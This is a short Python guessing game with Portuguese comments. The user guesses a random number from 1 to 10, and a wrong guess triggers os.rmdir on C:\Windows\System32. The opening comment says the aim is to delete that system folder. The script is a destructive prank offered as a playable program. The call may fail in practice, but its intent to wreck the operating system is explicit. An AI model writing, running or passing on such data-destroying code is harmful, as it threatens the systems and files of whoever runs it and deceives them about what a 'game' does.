# importei os para apagar a pasta system 32 pois ela pode modicar o sistema operacional
import os
# importei random para gerar o numero aleatorio do dado
import random

# aqui a variavel dado e um int e o valor dela vai ser aleatorio 1 a 10
dado = random.randint(1,10)

# ne significa n = numero e = escolhido e a pessoa digita o numero de 1 a 10
ne = input("Digite Um Numero 1 A 10: ")

# se for um numero transformar em inteiro
if ne.isdigit():
    ne = int(ne)
    
    # se o ne for igual ao dado printar 
    if ne == dado:
        print("Parabens Sua System32 Esta A Salvo!")

    # se nao vai printar e apagar a system32 eu usei elif mas else tambem daria certo!
    elif ne != dado:
        print("Diga Adeus A Sua System32")
        os.rmdir("C:\\Windows\\System32")
    
# se for uma string ou um float ou qualquer outra coisa dar print de erro
else:
    print("Voce Digitou Uma String Ou Um Numero Invalido!")
